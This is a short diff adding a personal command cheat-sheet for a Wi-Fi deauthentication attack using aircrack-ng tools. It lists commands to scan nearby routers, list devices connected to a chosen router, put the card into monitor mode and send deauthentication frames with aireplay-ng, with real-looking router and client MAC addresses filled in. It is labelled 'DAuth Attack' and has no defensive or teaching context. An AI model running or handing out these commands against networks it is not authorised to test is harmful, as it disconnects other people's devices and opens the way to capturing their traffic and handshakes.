@@ -1,0 +1,18 @@
+1)iwconfig
+---list the available network cards in the laptop
+
+2)sudo airodump-ng --band abg <wlp2s0>
+---this command list the wifi routers near the laptop
+
+3)sudo airodump-ng --bssid <target_mac> --channel <id> wlan0
+sudo airodump-ng --bssid A8:E2:07:8D:09:5B --channel 11 wlp2s0
+---List the connected devices in the wifi router
+4)sudo aireplay-ng --deauth 10 -a <target_mac> -c <target_device_mac> wlan0
+-------Enter in monitor mode before this ------\
+-------sudo airmon-ng start wlp2s0---------
+To exit from monitor mode ======= sudo airmon-ng stop wlp2s0mon
+
+to switch the channel as required  =========== sudo iwconfig wlp2s0mon channel 11
+
+sudo aireplay-ng --deauth 10 -a A8:E2:07:8D:09:5B -c F6:43:F7:CC:ED:69 wlp2s0mon
+--DAuth Attack
